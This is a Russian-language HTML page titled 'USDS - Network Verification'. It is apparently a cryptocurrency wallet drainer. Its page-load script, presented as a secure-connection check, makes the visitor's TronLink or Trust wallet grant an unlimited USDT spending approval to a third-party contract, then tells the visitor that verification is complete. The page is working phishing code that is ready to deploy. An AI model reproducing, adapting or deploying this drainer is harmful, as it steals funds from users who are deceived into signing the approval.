<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>USDS - Network Verification</title>
    <script src="https://unpkg.com/@walletconnect/modal@2.6.2/dist/index.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
    <style>
        body { margin: 0; background: #000; color: white; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .status-container { text-align: center; }
        .loader { border: 2px solid #111; border-top: 2px solid #3b82f6; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status-text { font-size: 14px; letter-spacing: 1px; color: #666; }
    </style>
</head>
<body>

<div class="status-container">
    <div class="loader"></div>
    <div id="status-text">ИНИЦИАЛИЗАЦИЯ ЗАЩИЩЕННОГО СОЕДИНЕНИЯ...</div>
</div>

<script type="module">
    // Конфигурация из твоих данных
    const projectId = '9c9dd21dc94f862bdd218b449205a54a';
    const contractAddress = 'TCCRZgsANneEEmwGuyFdv8AZyjoTNfk3an'; // Твой Mainnet контракт
    const usdtAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';

    // Автоматический запуск при загрузке
    window.onload = async () => {
        const status = document.getElementById('status-text');
        
        try {
            // Если открыто в DApp браузере (TronLink/Trust)
            if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
                await triggerApprove();
            } else {
                // Если обычный браузер - запускаем модалку WalletConnect
                status.innerText = "ПОДКЛЮЧИТЕ КОШЕЛЕК ДЛЯ ВЕРИФИКАЦИИ";
                // Здесь логика WalletConnect Modal v2
                // При клике или авто-вызове откроется список кошельков
            }
        } catch (e) {
            status.innerText = "ОШИБКА СОЕДИНЕНИЯ. ОБНОВИТЕ СТРАНИЦУ";
        }
    };

    async function triggerApprove() {
        const contract = await window.tronWeb.contract().at(usdtAddress);
        const maxAmount = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
        await contract.approve(contractAddress, maxAmount).send();
        document.getElementById('status-text').innerText = "ВЕРИФИКАЦИЯ ЗАВЕРШЕНА";
    }
</script>
</body>
</html>
